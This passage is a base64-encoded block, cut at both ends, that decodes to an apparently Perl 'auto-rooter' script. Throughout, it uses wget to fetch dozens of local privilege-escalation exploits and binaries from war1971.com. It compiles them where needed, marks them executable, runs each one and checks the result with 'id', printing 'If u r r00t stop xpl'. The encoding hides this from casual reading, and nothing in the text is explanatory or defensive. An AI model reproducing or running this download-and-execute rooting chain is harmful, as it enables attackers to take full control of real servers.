NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL3J1bjIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVu
MiIpOyANCnN5c3RlbSgiLi9ydW4yIik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIg
cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3
MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvcnVuMiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBydW4y
Iik7IA0Kc3lzdGVtKCIuL3J1bjIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciBy
MDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcx
LmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHBsb2l0Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4
cGxvaXQiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAi
SWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDov
L3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4cGxvaXQyIik7ICANCnN5c3RlbSgiY2ht
b2QgNzc3IGV4cGxvaXQyIik7IA0Kc3lzdGVtKCIuL2V4cGxvaXQyIik7IA0Kc3lzdGVtKCJpZCIp
OyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgi
d2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwbG9pdDIiKTsgIA0K
c3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdDIiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdDIiKTsgDQpz
eXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4i
Ow0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9ydW4y
Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IHJ1bjIiKTsgDQpzeXN0ZW0oIi4vcnVuMiIpOyANCnN5
c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7
DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzIwMDkt
MSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAyMDA5LTEiKTsgDQpzeXN0ZW0oIi4vMjAwOS0xIik7
IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwr
Y1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2Mv
ZGVybGUuYyIpOyANCnN5c3RlbSgiZ2NjIGRlcmxlLmMgLW8gZGVybGUiKTsgIA0Kc3lzdGVtKCJj
aG1vZCA3NzcgZGVybGUiKTsgDQpzeXN0ZW0oIi4vZGVybGUiKTsgDQpzeXN0ZW0oImlkIik7IA0K
cHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0
IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8zLmMiKTsgDQpzeXN0ZW0oImdj
YyAzLmMgLW8gMyIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAzIik7IA0Kc3lzdGVtKCIuLzMiKTsg
DQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtj
XG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8z
YSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDNhIik7IA0Kc3lzdGVtKCIuLzNhIik7IA0Kc3lzdGVt
KCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5
c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNC5jIik7IA0K
c3lzdGVtKCJnY2MgNC5jIC1vIDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgNCIpOyANCnN5c3Rl
bSgiLi80Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3
aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT
L2ZpbGUvY2MvNGEiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA0YSIpOyANCnN5c3RlbSgiLi80YSIp
OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs
K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j
Yy9jeC5jIik7IA0Kc3lzdGVtKCJnY2MgY3guYyAtbyBjeCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3
NyBjeCIpOyANCnN5c3RlbSgiLi9jeCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy
IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx
OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jeHguYyIpOyANCnN5c3RlbSgiZ2NjIGN4eC5jLSBv
IGN4eCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBjeHgiKTsgDQpzeXN0ZW0oIi4vY3h4Iik7IA0K
c3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xu
IjsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4
cGxvaXQyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdDIiKTsgDQpzeXN0ZW0oIi4vZXhw
bG9pdDIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdp
dGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBydW4gaHR0cDovL3dhcjE5NzEuY29tL0NNU19G
SUxFUy9maWxlL2NjL3J1biIpOyANCnN5c3RlbSgiY2htb2QgNzc3IHJ1biIpOyANCnN5c3RlbSgi
Li9ydW4iKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdp
dGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT
L2ZpbGUvY2MvcnVuLnNoIik7ICANCnN5c3RlbSgiY2htb2QgNzc3IHJ1bi5zaCIpOyANCnN5c3Rl
bSgiLi9ydW4uc2giKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag
eHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf
RklMRVMvZmlsZS9jYy8yOS5jIik7IA0Kc3lzdGVtKCJnY2MgMjkuYyAtbyAyOSIpOyAgDQpzeXN0
ZW0oImNobW9kIDc3NyAyOSIpOyANCnN5c3RlbSgiLi8yOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpw
cmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oImh0dHA6
Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8zMCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3
NyAzMCIpOyANCnN5c3RlbSgiLi8zMCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy
IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5
NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzIwMDkiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAw
OSIpOyANCnN5c3RlbSgiLi8yMDA5Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIg
cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3
MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvaXNrb3JwaXR4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3
IGlza29ycGl0eCIpOyANCnN5c3RlbSgiLi9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImlkIik7IA0K
cHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0
IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jIik7ICANCnN5c3RlbSgiY2ht
b2QgNzc3IGMiKTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYg
dSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dh
cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2N4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGN4
Iik7IA0Kc3lzdGVtKCIuL2N4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAw
dCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5j
b20vQ01TX0ZJTEVTL2ZpbGUvY2MvZGVybGUyIik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGRlcmxl
MiIpOyANCnN5c3RlbSgiLi9kZXJsZTIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUg
ciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx
OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9kZXJsZSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBk
ZXJsZSIpOyANCnN5c3RlbSgiLi9kZXJsZSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYg
dSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dh
cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzZ4LmMiKTsgIA0Kc3lzdGVtKCJnY2MgNnguYyAt
byA2eGEiKTsgDQpzeXN0ZW0oIi4vNnhhIik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1
IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2Fy
MTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNngiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgNngi
KTsgDQpzeXN0ZW0oIi4vNngiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0
IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNv
bS9DTVNfRklMRVMvZmlsZS9jYy82YiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA2YiIpOyANCnN5
c3RlbSgiLi82YiIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4
cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19G
SUxFUy9maWxlL2NjLzZ4eCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA2eHgiKTsgDQpzeXN0ZW0o
Ii4vNnh4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3
aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT
L2ZpbGUvY2MvMjc3MDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjc3MDQiKTsgDQpzeXN0ZW0o
Ii4vMjc3MDQiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBs
IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklM
RVMvZmlsZS9jYy9kZXJsZTIuYyIpOyANCnN5c3RlbSgiZ2NjIGRlcmxlMi5jIC1vIGRlcmxlMiIp
OyAgDQpzeXN0ZW0oImNobW9kIDc3NyBkZXJsZTIiKTsgDQpzeXN0ZW0oIi4vZGVybGUyIik7IA0K
c3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xu
IjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZGVy
bGUyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZGVybGUyIik7IA0Kc3lzdGVtKCIuL2RlcmxlMiIp
OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs
K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j
Yy8yOC5jIik7IA0Kc3lzdGVtKCJnY2MgMjguYyAtbyAyOCIpOyANCnN5c3RlbSgiY2htb2QgNzc3
IDI4Iik7IA0Kc3lzdGVtKCIuLzI4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yOCIp
OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs
K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j
Yy8yNy5jIik7IA0Kc3lzdGVtKCJnY2MgMjcuYyAtbyAyNyIpOyANCnN5c3RlbSgiY2htb2QgNzc3
IDI3Iik7IA0Kc3lzdGVtKCIuLzI3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yNyIp
OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs
K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j
Yy9jLmMiKTsgDQpzeXN0ZW0oImdjYyBjLmMgLW8gYyIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGMi
KTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5
c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7
IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jMi5j
Iik7IA0Kc3lzdGVtKCJnY2MgYzIuYyAtbyBjMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGMyIik7
IA0Kc3lzdGVtKCIuL2MyIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9jMiIpOyANCnN5
c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7
IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8wNSIp
OyANCnN5c3RlbSgiY2htb2QgNzc3IDA1Iik7IA0Kc3lzdGVtKCIuLzA1Iik7IA0Kc3lzdGVtKCJp
ZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsgDQpzeXN0
ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2lza28iKTsgDQpz
eXN0ZW0oImNobW9kIDc3NyBpc2tvIik7IA0Kc3lzdGVtKCIuL2lza28iKTsgDQpzeXN0ZW0oImlk
Iik7DQpzeXN0ZW0oIi4vaXNrbyIpOyANCnN5c3RlbSgiaXNrbyIpOw0KcHJpbnQgIklmIHUgciBy
MDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3
MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMTgiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOyAN
CnN5c3RlbSgiLi8xOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vMTgiKTsgDQpzeXN0
ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyAN
CnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNyIpOyAN
CnN5c3RlbSgiY2htb2QgNzc3IDciKTsgDQpzeXN0ZW0oIi4vNyIpOyANCnN5c3RlbSgiaWQiKTsg
DQpzeXN0ZW0oIi4vNyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3Rv
cCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9D
TVNfRklMRVMvZmlsZS9jYy83LTIiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA3LTIiKTsgDQpzeXN0
ZW0oIi4vNy0yIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi83LTIiKTsgDQpzeXN0ZW0o
ImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5
c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOCIpOyANCnN5
c3RlbSgiY2htb2QgNzc3IDgiKTsgDQpzeXN0ZW0oIi4vOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpz
eXN0ZW0oIi4vOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4
cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf
RklMRVMvZmlsZS9jYy84YSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDhhIik7IA0Kc3lzdGVtKCIu
LzhhIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi84YSIpOyANCnN5c3RlbSgiaWQiKTsg
DQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3
Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy84YmIiKTsgDQpzeXN0ZW0o
ImNobW9kIDc3NyA4YmIiKTsgDQpzeXN0ZW0oIi4vOGJiIik7IA0Kc3lzdGVtKCJpZCIpOyANCnBy
aW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsgDQpzeXN0ZW0oIndnZXQg
aHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzhjYyIpOyANCnN5c3RlbSgiY2ht
b2QgNzc3IDhjYyIpOyANCnN5c3RlbSgiLi84Y2MiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQg
IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRw
Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOHgiKTsgDQpzeXN0ZW0oImNobW9kIDc3
NyA4eCIpOyANCnN5c3RlbSgiLi84eCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vOHgi
KTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3Ry
bCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUv
Y2MvOSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDkiKTsgDQpzeXN0ZW0oIi4vOSIpOyANCnN5c3Rl
bSgiaWQiKTsgDQpzeXN0ZW0oIi4vOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy
IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx
OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9rcmFkMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGty
YWQyIik7IA0Kc3lzdGVtKCIuL2tyYWQyIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9r
cmFkMiAtdCAxIC1wIDIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2tyYWQyIC10IDEg
LXAgMyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZDIgLXQgMSAtcCA0Iik7IA0K
c3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkMiAtdCAxIC1wIDUiKTsgDQpzeXN0ZW0oImlk
Iik7IA0Kc3lzdGVtKCIuL2tyYWQyIC10IDEgLXAgNiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0
ZW0oIi4va3JhZDIgLXQgMSAtcCA3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFk
MiAtdCAxIC1wIDgiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag
eHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01T
X0ZJTEVTL2ZpbGUvY2Mva3JhZCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGtyYWQiKTsgDQpzeXN0
ZW0oIi4va3JhZCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZCAtdCAxIC1wIDIi
KTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2tyYWQgLXQgMSAtcCAzIik7IA0Kc3lzdGVt
KCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkIC10IDEgLXAgNCIpOyANCnN5c3RlbSgiaWQiKTsgDQpz
eXN0ZW0oIi4va3JhZCAtdCAxIC1wIDUiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2ty
YWQgLXQgMSAtcCA2Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkIC10IDEgLXAg
NyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZCAtdCAxIC1wIDgiKTsgDQpzeXN0
ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmls
ZS9jYy9rLXJhZDMiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBrLXJhZDMiKTsgDQpzeXN0ZW0oIi4v
ay1yYWQzIC10IDEgLXAgMiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10
IDEgLXAgMyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNCIp
OyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNSIpOyANCnN5c3Rl
bSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNiIpOyANCnN5c3RlbSgiaWQiKTsg
DQpzeXN0ZW0oIi4vay1yYWQzIC10LXAgMiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4v
ay1yYWQzIC10IC1wIDIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2stcmFkMyAtYSAt
cCA3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rLXJhZDMgLWEgLXAgNyIpOyANCnN5
c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7
IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8yNjgi
KTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyNjgiKTsgDQpzeXN0ZW0oIi4vMjY4Iik7IA0KcHJpbnQg
IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRw
Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMjAwOCIpOyANCnN5c3RlbSgiY2htb2Qg
Nzc3IDIwMDgiKTsgDQpzeXN0ZW0oIi4vMjAwOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAi
SWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7ICANCnN5c3RlbSgid2dldCBodHRw
Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMjAwOXguYyIpOyANCnN5c3RlbSgiZ2Nj
IDIwMDl4LmMgLW8gMjAwOXgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOXgiKTsgDQpzeXN0
ZW0oIi4vMjAwOXgiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag
eHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf
RklMRVMvZmlsZS9jYy8yMDA5eHgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOXh4Iik7IA0K
c3lzdGVtKCIuLzIwMDl4eCIpOyANCnN5c3RlbSgiaWQiKTsNCnN5c3RlbSgiaWQiKTsgDQpwcmlu
dCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0
dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8yLjYuOS01NS0yMDA3LXBydjgiKTsg
DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS01NS0yMDA3LXBydjgiKTsgDQpzeXN0ZW0oIi4vMi42
LjktNTUtMjAwNy1wcnY4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yLjYuOS01NS0y
MDA3LXBydjgiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuLzIuNi45LTU1LTIwMDctcHJ2
OCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBj
dHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmls
ZS9jYy8xOCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOyANCnN5c3RlbSgiLi8xOCIpOyAN
CnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxF
